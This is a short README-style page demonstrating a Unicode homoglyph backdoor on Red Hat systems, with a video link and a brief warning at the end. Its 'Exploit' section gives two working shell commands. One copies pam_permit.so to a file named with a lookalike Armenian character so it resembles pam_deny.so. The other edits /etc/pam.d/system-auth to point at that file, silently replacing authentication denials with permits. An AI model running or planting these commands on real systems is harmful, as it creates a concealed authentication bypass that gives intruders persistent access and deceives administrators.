Unicode homoglyph backdoor tricks
======================

"*...The Unicode character set contains many strongly homoglyphic characters. These present security risks in a variety of situations...*" (Wikipedia)

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=Os0QKZgvE_I" target="_blank"><img src="http://img.youtube.com/vi/Os0QKZgvE_I/0.jpg" alt="Messing around with homoglyphs - pam_deny.so" width="480" height="360" border="10" /></a>

**Exploit**

*redhat and derivates*

```shell-session

cp -av /lib*/security/pam_permit.so  /tmp/pam_de$'\xd5\xb8'y.so
sed -i 's/deny.so/de\xd5\xb8y.so/g' /etc/pam.d/system-auth

```

Homoglyph could be dangerous! Keep your eyes open! O.O

